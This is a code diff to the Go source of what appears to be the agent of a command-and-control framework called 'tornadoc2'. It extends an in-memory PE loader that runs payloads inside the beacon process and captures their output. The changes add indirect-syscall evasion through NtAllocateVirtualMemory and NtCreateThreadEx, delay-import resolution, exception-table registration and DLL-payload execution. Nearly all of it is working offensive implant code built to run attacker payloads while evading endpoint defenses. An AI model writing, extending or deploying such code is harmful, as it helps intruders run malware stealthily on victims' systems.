@@ -52,31 +52,35 @@ import (
 	"sync"
 	"syscall"
 	"unsafe"
+
+	"tornadoc2/agent/evasion"
+	"tornadoc2/agent/syscalls"
 )
 
 var (
-	peKernel32       = syscall.NewLazyDLL("kernel32.dll")
-	peVirtualAlloc   = peKernel32.NewProc("VirtualAlloc")
-	peVirtualFree    = peKernel32.NewProc("VirtualFree")
-	peVirtualProtect = peKernel32.NewProc("VirtualProtect")
-	peLoadLibraryA   = peKernel32.NewProc("LoadLibraryA")
-	peGetProcAddress = peKernel32.NewProc("GetProcAddress")
-	peGetModuleHandleA = peKernel32.NewProc("GetModuleHandleA")
-	peCreateThread   = peKernel32.NewProc("CreateThread")
-	peWaitForSingleObject = peKernel32.NewProc("WaitForSingleObject")
-	peCloseHandle    = peKernel32.NewProc("CloseHandle")
-	peGetLastError   = peKernel32.NewProc("GetLastError")
-	peRtlAddFunctionTable = peKernel32.NewProc("RtlAddFunctionTable")
+	peKernel32               = syscall.NewLazyDLL("kernel32.dll")
+	peVirtualAlloc           = peKernel32.NewProc("VirtualAlloc")
+	peVirtualFree            = peKernel32.NewProc("VirtualFree")
+	peVirtualProtect         = peKernel32.NewProc("VirtualProtect")
+	peLoadLibraryA           = peKernel32.NewProc("LoadLibraryA")
+	peGetProcAddress         = peKernel32.NewProc("GetProcAddress")
+	peGetModuleHandleA       = peKernel32.NewProc("GetModuleHandleA")
+	peCreateThread           = peKernel32.NewProc("CreateThread")
+	peWaitForSingleObject    = peKernel32.NewProc("WaitForSingleObject")
+	peCloseHandle            = peKernel32.NewProc("CloseHandle")
+	peGetLastError           = peKernel32.NewProc("GetLastError")
+	peRtlAddFunctionTable    = peKernel32.NewProc("RtlAddFunctionTable")
+	peRtlDeleteFunctionTable = peKernel32.NewProc("RtlDeleteFunctionTable")
 )
 
 var (
-	peGetCurrentProcess    = peKernel32.NewProc("GetCurrentProcess")
-	peExitThread           = peKernel32.NewProc("ExitThread")
-	peTerminateProcess     = peKernel32.NewProc("TerminateProcess")
-	peRealGetStdHandle     = peKernel32.NewProc("GetStdHandle")
-	peRealWriteFile        = peKernel32.NewProc("WriteFile")
-	peRealWriteConsoleA    = peKernel32.NewProc("WriteConsoleA")
-	peRealWriteConsoleW    = peKernel32.NewProc("WriteConsoleW")
+	peGetCurrentProcess = peKernel32.NewProc("GetCurrentProcess")
+	peExitThread        = peKernel32.NewProc("ExitThread")
+	peTerminateProcess  = peKernel32.NewProc("TerminateProcess")
+	peRealGetStdHandle  = peKernel32.NewProc("GetStdHandle")
+	peRealWriteFile     = peKernel32.NewProc("WriteFile")
+	peRealWriteConsoleA = peKernel32.NewProc("WriteConsoleA")
+	peRealWriteConsoleW = peKernel32.NewProc("WriteConsoleW")
 )
 
 // Fake handle values the payload receives from GetStdHandle. Any
@@ -107,12 +111,12 @@ var (
 //
 // The list splits into two groups:
 //
-//   * process-termination functions. The payload's CRT calls these
+//   - process-termination functions. The payload's CRT calls these
 //     when main() returns. If they reach the OS, the beacon dies.
 //     The stubs redirect to ExitThread, which terminates just the
 //     payload's entry thread.
 //
-//   * std-handle functions. The payload asks for STD_OUTPUT_HANDLE
+//   - std-handle functions. The payload asks for STD_OUTPUT_HANDLE
 //     and gets one of our fake values. Its subsequent WriteFile
 //     calls are detected by the WriteFile stub and their bytes
 //     appended to the capture buffer.
@@ -252,20 +256,20 @@ const (
 	peMemReserve = 0x2000
 	peMemRelease = 0x8000
 
-	pePageNoAccess       = 0x01
-	pePageReadOnly       = 0x02
-	pePageReadWrite      = 0x04
-	pePageWriteCopy      = 0x08
-	pePageExecute        = 0x10
-	pePageExecuteRead    = 0x20
+	pePageNoAccess         = 0x01
+	pePageReadOnly         = 0x02
+	pePageReadWrite        = 0x04
+	pePageWriteCopy        = 0x08
+	pePageExecute          = 0x10
+	pePageExecuteRead      = 0x20
 	pePageExecuteReadWrite = 0x40
 	pePageExecuteWriteCopy = 0x80
 
-	peScnCntCode    = 0x00000020
+	peScnCntCode     = 0x00000020
 	peScnCntInitData = 0x00000040
-	peScnMemExecute = 0x20000000
-	peScnMemRead    = 0x40000000
-	peScnMemWrite   = 0x80000000
+	peScnMemExecute  = 0x20000000
+	peScnMemRead     = 0x40000000
+	peScnMemWrite    = 0x80000000
 
 	peDirExport    = 0
 	peDirImport    = 1
@@ -291,13 +295,15 @@ type peSection struct {
 }
 
 type peImage struct {
-	raw      []byte
-	is64     bool
+	raw       []byte
+	is64      bool
+	isDLL     bool
 	preferred uint64
 	imageBase uintptr
 	imageSize uintptr
 	entryRVA  uint32
 	sections  []peSection
+	funcTable uintptr
 	dirs      [16]struct{ RVA, Size uint32 }
 }
 
@@ -308,11 +314,23 @@ func peRU64(b []byte, o int) uint64 { return binary.LittleEndian.Uint64(b[o:]) }
 func peAlignUp(v, a uint32) uint32 { return (v + a - 1) & ^(a - 1) }
 
 func peAlloc(size uintptr) (uintptr, error) {
-	p, _, err := peVirtualAlloc.Call(0, size,
-		uintptr(peMemCommit|peMemReserve),
-		uintptr(pePageReadWrite))
-	if p == 0 {
-		return 0, fmt.Errorf("VirtualAlloc(%d): %v", size, err)
+	p := uintptr(0)
+	region := size
+	var err error
+	if evasion.SyscallMethod() == "indirect" {
+		err = syscalls.NtAllocateVirtualMemory(^uintptr(0), &p, 0,
+			&region, peMemCommit|peMemReserve, pePageReadWrite)
+	}
+	if err != nil || p == 0 {
+		// Fall back to kernel32 if ntdll resolution fails.
+		var callErr error
+		p, _, callErr = peVirtualAlloc.Call(0, size,
+			uintptr(peMemCommit|peMemReserve),
+			uintptr(pePageReadWrite))
+		if p == 0 {
+			return 0, fmt.Errorf("VirtualAlloc(%d): %v (%v)",
+				size, callErr, err)
+		}
 	}
 	return p, nil
 }
@@ -370,6 +388,7 @@ func peParse(raw []byte) (*peImage, error) {
 	default:
 		return nil, fmt.Errorf("pe: unsupported machine 0x%04X", machine)
 	}
+	img.isDLL = peRU16(raw, fileHdr+18)&0x2000 != 0
 	nsec := int(peRU16(raw, fileHdr+2))
 	optSize := int(peRU16(raw, fileHdr+16))
 	optOff := fileHdr + 20
@@ -553,40 +572,10 @@ func peProcessImports(img *peImage) error {
 			if entry == 0 {
 				break
 			}
-			var (
-				name    string
-				ordinal bool
-				ord     uint16
-			)
-			if img.is64 && entry&0x8000000000000000 != 0 {
-				ordinal = true
-				ord = uint16(entry & 0xFFFF)
-				name = fmt.Sprintf("#%d", ord)
-			} else if !img.is64 && entry&0x80000000 != 0 {
-				ordinal = true
-				ord = uint16(entry & 0xFFFF)
-				name = fmt.Sprintf("#%d", ord)
-			} else {
-				nameRVA2 := uint32(entry)
-				namePtr := peRVA(base, nameRVA2+2)
-				name = peCStr(namePtr)
-			}
-
-			var addr uintptr
-			if ordinal {
-				addr, _, _ = peGetProcAddress.Call(hLib, uintptr(ord))
-			} else {
-				nameB, _ := syscall.BytePtrFromString(name)
-				addr, _, _ = peGetProcAddress.Call(hLib,
-					uintptr(unsafe.Pointer(nameB)))
-			}
-			if addr == 0 {
-				return fmt.Errorf("pe: import %s!%s not resolvable",
-					libName, name)
-			}
-
-			if hook, ok := peHooks[name]; ok {
-				addr = hook
+			addr, _, err := peResolveThunk(img, base, hLib,
+				libName, entry)
+			if err != nil {
+				return err
 			}
 			if img.is64 {
 				*(*uint64)(unsafe.Pointer(iat)) = uint64(addr)
@@ -597,6 +586,107 @@ func peProcessImports(img *peImage) error {
 			iat += ptrSize
 		}
 		desc += 20
+	}
+	return nil
+}
+
+func peResolveThunk(img *peImage, base, hLib uintptr,
+	libName string, entry uint64) (uintptr, string, error) {
+	var (
+		name    string
+		ordinal bool
+		ord     uint16
+	)
+	if img.is64 && entry&0x8000000000000000 != 0 {
+		ordinal = true
+		ord = uint16(entry & 0xFFFF)
+		name = fmt.Sprintf("#%d", ord)
+	} else if !img.is64 && entry&0x80000000 != 0 {
+		ordinal = true
+		ord = uint16(entry & 0xFFFF)
+		name = fmt.Sprintf("#%d", ord)
+	} else {
+		name = peCStr(peRVA(base, uint32(entry)+2))
+	}
+	var addr uintptr
+	if ordinal {
+		addr, _, _ = peGetProcAddress.Call(hLib, uintptr(ord))
+	} else {
+		nameB, _ := syscall.BytePtrFromString(name)
+		addr, _, _ = peGetProcAddress.Call(hLib,
+			uintptr(unsafe.Pointer(nameB)))
+	}
+	if addr == 0 {
+		return 0, name, fmt.Errorf(
+			"pe: import %s!%s not resolvable", libName, name)
+	}
+	if hook, ok := peHooks[name]; ok {
+		addr = hook
+	}
+	return addr, name, nil
+}
+
+// peProcessDelayImports resolves the delay-load directory eagerly.
+// Only the modern RVA-based descriptor (dlattrRva) is accepted;
+// the pre-VC7 VA form is rare in payloads.
+func peProcessDelayImports(img *peImage) error {
+	dir := img.dirs[peDirDelay]
+	if dir.RVA == 0 || dir.Size == 0 {
+		return nil
+	}
+	base := img.imageBase
+	ptrSize := uintptr(4)
+	if img.is64 {
+		ptrSize = 8
+	}
+	desc := peRVA(base, dir.RVA)
+	for {
+		attrs := peRU32At(desc, 0)
+		nameRVA := peRU32At(desc, 4)
+		intRVA := peRU32At(desc, 12)
+		iatRVA := peRU32At(desc, 16)
+		if nameRVA == 0 && intRVA == 0 && iatRVA == 0 {
+			break
+		}
+		if attrs&1 == 0 {
+			desc += 32
+			continue
+		}
+		libName := peCStr(peRVA(base, nameRVA))
+		libB, _ := syscall.BytePtrFromString(libName)
+		hLib, _, _ := peLoadLibraryA.Call(
+			uintptr(unsafe.Pointer(libB)))
+		if hLib == 0 {
+			return fmt.Errorf(
+				"pe: delay-import library %q not loadable",
+				libName)
+		}
+		thunk := peRVA(base, intRVA)
+		iat := peRVA(base, iatRVA)
+		for {
+			var entry uint64
+			if img.is64 {
+				entry = *(*uint64)(unsafe.Pointer(thunk))
+			} else {
+				entry = uint64(*(*uint32)(unsafe.Pointer(thunk)))
+			}
+			if entry == 0 {
+				break
+			}
+			addr, _, err := peResolveThunk(img, base, hLib,
+				libName, entry)
+			if err != nil {
+				return err
+			}
+			if img.is64 {
+				*(*uint64)(unsafe.Pointer(iat)) = uint64(addr)
+			} else {
+				*(*uint32)(unsafe.Pointer(iat)) = uint32(addr)
+			}
+			thunk += ptrSize
+			iat += ptrSize
+		}
+		desc += 32
 	}
 	return nil
 }
@@ -716,6 +806,35 @@ func peFinalizeSections(img *peImage) {
 	peProtect(img.imageBase, 0x1000, pePageReadOnly)
 }
 
+// peRegisterExceptionTable registers the image's .pdata so a
+// C++ exception or a stack walk can unwind through the payload.
+// Without this an x64 payload that throws terminates the process.
+func peRegisterExceptionTable(img *peImage) error {
+	if !img.is64 {
+		return nil
+	}
+	dir := img.dirs[peDirException]
+	if dir.RVA == 0 || dir.Size < 12 {
+		return nil
+	}
+	table := peRVA(img.imageBase, dir.RVA)
+	count := uint32(dir.Size / 12)
+	r, _, errno := peRtlAddFunctionTable.Call(table,
+		uintptr(count), img.imageBase)
+	if r == 0 {
+		return fmt.Errorf("RtlAddFunctionTable: %v", errno)
+	}
+	img.funcTable = table
+	return nil
+}
+
+func peUnregisterExceptionTable(img *peImage) {
+	if img.funcTable != 0 {
+		peRtlDeleteFunctionTable.Call(img.funcTable)
+		img.funcTable = 0
+	}
+}
+
 // ---------------------------------------------------------------
 // Entry point
 
@@ -751,11 +870,15 @@ func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
 	keepMapping := false
 	defer func() {
 		if !keepMapping {
+			peUnregisterExceptionTable(img)
 			peVirtualFree.Call(img.imageBase, 0, uintptr(peMemRelease))
 		}
 	}()
 
 	if err := peProcessImports(img); err != nil {
+		return "", -1, err
+	}
+	if err := peProcessDelayImports(img); err != nil {
 		return "", -1, err
 	}
 	if err := peProcessRelocs(img); err != nil {
@@ -765,31 +888,54 @@ func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
 		return "", -1, err
 	}
 	peFinalizeSections(img)
+	if err := peRegisterExceptionTable(img); err != nil {
+		return "", -1, err
+	}
 
 	entry := peRVA(img.imageBase, img.entryRVA)
 
-	var tid uint32
-	hThread, _, callErr := peCreateThread.Call(
-		0,                             // lpThreadAttributes
-		0,                             // dwStackSize (default)
-		entry,                         // lpStartAddress
-		img.imageBase,                 // lpParameter -> hInstance
-		1,                             // DLL_PROCESS_ATTACH
-		uintptr(unsafe.Pointer(&tid)), // lpThreadId
-	)
-	if hThread == 0 {
-		return "", -1, fmt.Errorf("pe: CreateThread failed: %v", callErr)
-	}
-	defer peCloseHandle.Call(hThread)
+	// A DLL entry point is DllMain(hinst, reason, reserved). Call it
+	// on this thread: it is already inside the loader window and
+	// does not need a fresh thread. An EXE entry point is a thread
+	// procedure; CreateThread's creation flags must be 0 (the old
+	// code passed CREATE_SUSPENDED and never resumed it).
+	if img.isDLL {
+		r, _, _ := syscall.SyscallN(entry, img.imageBase, 1, 0)
+		if r == 0 {
+			return "", -1, errors.New("pe: DllMain returned FALSE")
+		}
+	} else {
+		var tid uint32
+		var hThread uintptr
+		var threadErr error
+		if evasion.SyscallMethod() == "indirect" {
+			threadErr = syscalls.NtCreateThreadEx(&hThread, 0x1FFFFF, 0,
+				^uintptr(0), entry, img.imageBase, 0, 0, 0, 0, 0)
+		}
+		if threadErr != nil || hThread == 0 {
+			var callErr error
+			hThread, _, callErr = peCreateThread.Call(
+				0, 0, entry, img.imageBase, 0,
+				uintptr(unsafe.Pointer(&tid)))
+			if hThread == 0 {
+				return "", -1, fmt.Errorf(
+					"pe: CreateThread failed: %v (%v)",
+					callErr, threadErr)
+			}
+		}
+		defer peCloseHandle.Call(hThread)
 
-	if waitMs > 0 {
-		// WAIT_OBJECT_0 == 0. Any other return (WAIT_TIMEOUT,
-		// WAIT_FAILED) means the payload is still running and we
-		// must leave the image mapped.
-		if r, _, _ := peWaitForSingleObject.Call(
-			hThread, uintptr(waitMs)); uintptr(r) == 0 {
-			peVirtualFree.Call(img.imageBase, 0, uintptr(peMemRelease))
-			keepMapping = true // already freed; defer must not double-free
+		if waitMs > 0 {
+			// WAIT_OBJECT_0 == 0. Any other return (WAIT_TIMEOUT,
+			// WAIT_FAILED) means the payload is still running and
+			// we must leave the image mapped.
+			if r, _, _ := peWaitForSingleObject.Call(
+				hThread, uintptr(waitMs)); uintptr(r) == 0 {
+				peUnregisterExceptionTable(img)
+				peVirtualFree.Call(img.imageBase, 0,
+					uintptr(peMemRelease))
+				keepMapping = true // already freed; no double free
+			}
 		}
 	}
 
@@ -798,9 +944,13 @@ func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
 	// stays mapped for the lifetime of the beacon process.
 	keepMapping = true
 
+	kind := "exe"
+	if img.isDLL {
+		kind = "dll"
+	}
 	header := fmt.Sprintf(
-		"pe: loaded at 0x%x (image size 0x%x, entry RVA 0x%x, thread %d)\n",
-		img.imageBase, img.imageSize, img.entryRVA, tid)
+		"pe: loaded %s at 0x%x (image size 0x%x, entry RVA 0x%x)\n",
+		kind, img.imageBase, img.imageSize, img.entryRVA)
 
 	peCaptureMu.Lock()
 	captured := peCaptureBuf.String()
